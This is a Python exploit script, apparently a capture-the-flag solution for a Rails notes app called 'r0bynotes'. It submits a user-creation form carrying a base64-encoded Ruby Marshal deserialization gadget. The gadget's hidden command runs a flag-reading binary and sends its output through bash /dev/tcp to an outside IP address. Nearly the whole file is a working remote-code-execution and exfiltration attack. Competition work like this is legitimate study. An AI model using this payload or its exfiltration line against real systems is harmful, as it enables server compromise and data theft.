import base64
from requests import Session
from secrets import token_hex

URL = "https://r0bynotes.chal.perfect.blue"
# URL = "http://localhost:3000"

rnd = lambda: token_hex(10)

def quote(x):
    if not isinstance(x, bytes):
        x = x.encode()
    return ''.join(f'%{hex(z)[2:].zfill(2)}' for y in x for z in chr(y).encode())

s = Session()
def create(username, name, id):
    token = s.get(f"{URL}/users/new").text.split('"authenticity_token" value="')[1].split('"')[0]
    print(f"{URL}{id}")
    data = f'authenticity_token={quote(token)}&user[username]={quote(username)}&user[name]={quote(name)}&id[]={quote(id)}'
    return s.post(f"{URL}/users", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=data, allow_redirects=False).status_code

name = "BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQg6DkBpbnN0YW5jZW86P0FjdGl2ZU1vZGVsOjpBdHRyaWJ1dGVNZXRob2RzOjpDbGFzc01ldGhvZHM6OkNvZGVHZW5lcmF0b3IJOg1Ac291cmNlc1sGSSJBJXgoL2Jpbi9iYXNoIC1jICcvcmVhZF9mbGFnID4gL2Rldi90Y3AvMTQwLjExMy4yNC4xNDMvNDQ0NCcpBjoGRVQ6C0Bvd25lcm0wQWN0aXZlTW9kZWw6OkF0dHJpYnV0ZU1ldGhvZHM6OkNsYXNzTWV0aG9kczoKQHBhdGhJIgwocHduZWQpBjsJVDoKQGxpbmVpBjoMQG1ldGhvZDoMZXhlY3V0ZToQQGRlcHJlY2F0b3JtC0tlcm5lbA=="
print(create(f'organizers_{rnd()}', base64.b64decode(name), '/notes/' + rnd()))